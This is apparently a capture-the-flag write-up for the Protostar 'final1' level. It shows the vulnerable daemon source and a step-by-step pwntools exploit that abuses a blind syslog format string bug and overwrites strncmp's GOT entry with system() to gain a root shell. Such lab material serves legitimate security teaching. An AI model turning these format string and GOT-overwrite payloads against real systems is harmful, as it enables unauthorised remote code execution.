# Final 1

This level is a remote blind format string level. The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number.

When you are exploiting this and you don’t necessarily know your IP address and port number (proxy, NAT / DNAT, etc), you can determine that the string is properly aligned by seeing if it crashes or not when writing to an address you know is good.

Core files will be in /tmp.

This level is at `/opt/protostar/bin/final1`

```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```

## Solution (python3 - `pwntools`)

This time, the format string vulnerability concerns `syslog()` and `snprintf()` functions. Memory leak is in `/var/log/syslog`:

![](leak.png)

Both **username $USER** and **login $PASSWD** can be used to leak memory:

![](leak2.png)

As we can see the `'A'` are not perfectly aligned. So I just added a `'C'` to have an aligned address in the memory: 

```
[final1] $ username CAAAA %x %x %x %x %x %x %x %x %x %x
[final1] $ login BBBB %x %x %x %x %x %x %x %x %x %x
```

![](leak3.png)

I started to write the exploit and sent the same payload but I saw that the `'A'` were not aligned anymore:

```python
import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

r.sendlineafter(b"[final1] $ ", b"username CAAAA %x %x %x %x %x %x %x %x %x %x")
r.sendlineafter(b"[final1] $ ", b"login BBBB %x %x %x %x %x %x %x %x %x %x")

#r.interactive()
r.close()
```

![](leak4.png)

Just removing the `'C'` I added before won't be sufficient:

![](leak5.png)

So I figured out that the only that had changed was the **IP address + Port** from which the socket comes.

We need to do some "math" to adapt our payload:

```python
import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

our_ip, our_port = r.sock.getsockname()
padding = b"A" * (24 - len(f"{our_ip}:{our_port}"))

r.sendlineafter(b"[final1] $ ", b"username " + padding + b"BBBB" + b"%x %x %x %x %x %x %x %x %x %x")
r.sendlineafter(b"[final1] $ ", b"login CCCC %x %x %x %x %x %x %x %x %x %x")

#r.interactive()
r.close()
```

![](leak6.png)

Now we control the **17th** argument. To be completely sure, we can replace our payload by:

```python
import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

our_ip, our_port = r.sock.getsockname()
padding = b"A" * (24 - len(f"{our_ip}:{our_port}"))

r.sendlineafter(b"[final1] $ ", b"username " + padding + b"BBBB" + b"%17$x")
r.sendlineafter(b"[final1] $ ", b"login CCCC")

#r.interactive()
r.close()
```

![](leak7.png)

Let's identify which function we want to overwrite in the **GOT**. `strncmp()` seems to be a suitable candidate if we replace it with to `system()` since we control its first parameter **line**. 

If `strncmp` executes our commands as `system(<command>)` it will be like a "real" shell.

Let's retrieve the addresses we're interested in:

```console
root@protostar:/# gdb -p $(pidof final1)
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) info functions strncmp
All functions matching regular expression "strncmp":

File ../sysdeps/i386/i486/bits/string.h:
int __strncmp_g(const char *, const char *, size_t);

File strncmp.c:
int *__GI_strncmp(const char *, const char *, size_t);

---Type <return> to continue, or q <return> to quit---
Non-debugging symbols:
0x08048d9c  strncmp
0x08048d9c  strncmp@plt
(gdb) disass 0x08048d9c
Dump of assembler code for function strncmp@plt:
0x08048d9c <strncmp@plt+0>:     jmp    *0x804a1a8
0x08048da2 <strncmp@plt+6>:     push   $0x160
0x08048da7 <strncmp@plt+11>:    jmp    0x8048acc
End of assembler dump.
(gdb) x/x 0x804a1a8
0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:  0x08048da2
```

`0xb7ecffb0` is the address of `system()` and `0x804a1a8` is the **GOT** address of `strncmp()`.

**Note**: We can also divide our payload in to using both **username** and **login** fields:

![](leak_divided.png)

> Here it is `%15$x` because I tried an iterative approach (adding `'A'`'s) on localhost.

![](leak_divided_log.png)

### Writing the first 2 bytes

By running this payload (10) I was able to write `0x47` in the **GOT**:

```python
def int2byte(n):
    return str.encode(str(n))

password_payload = b"%" + int2byte(10) + b"x" + b"%17$n"
```

Run `python3 exploit.py` and on the VM run `gdb --pid $(pidof final1)`. Then you examine the content of `strncmp()` address in the **GOT**:

![](examine.png)

By continually inspecting the **GOT** with `gdb` and adding spaces with `int2byte(NUMBER_OF_SPACES)`, I ended up with this exploit to write the first 2 bytes:

```python
import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

def int2byte(n):
    return str.encode(str(n))

our_ip, our_port = r.sock.getsockname()
padding = b"A" * (24 - len(f"{our_ip}:{our_port}"))
system_addr = 0xb7ecffb0 
strncmp_addr = 0x804a1a8

username_payload = padding + pwn.p32(strncmp_addr) + pwn.p32(strncmp_addr+2)
password_payload = b"%" + int2byte(0xffb0 - 0x3d - 0x4) + b"x" + b"%17$n"

r.sendlineafter(b"[final1] $ ", b"username " + username_payload)
r.sendlineafter(b"[final1] $ ", b"login " + password_payload)

r.interactive()
r.close()
```

![](first_2_bytes.png)

### Writing the last 2 bytes

This [video of **LiveOverflow**](https://www.youtube.com/watch?v=t1LH9D5cuK4) helped me a lot to remember a trick to  write the last 2 bytes.

Again by playing with number of spaces:

![](last_2_bytes_in_the_way.png)

Finally:

```python
import pwn

host = "192.168.1.251"
port = 2994

r = pwn.remote(host,port)

def int2byte(n):
    return str.encode(str(n))

our_ip, our_port = r.sock.getsockname()
padding = b"A" * (24 - len(f"{our_ip}:{our_port}"))
system_addr = 0xb7ecffb0 
strncmp_addr = 0x804a1a8

username_payload = padding + pwn.p32(strncmp_addr) + pwn.p32(strncmp_addr+2)
password_payload = b"%" + int2byte(0xffb0 - 0x3d - 0x4) + b"x" + b"%17$n" + b"%" + int2byte(0x1b7ec-0xffce+30) + b"x" + b"%18$n"

r.sendlineafter(b"[final1] $ ", b"username " + username_payload)
r.sendlineafter(b"[final1] $ ", b"login " + password_payload)

r.interactive()
r.close()
```

![](last_2_bytes.png)

![](ROOT.png)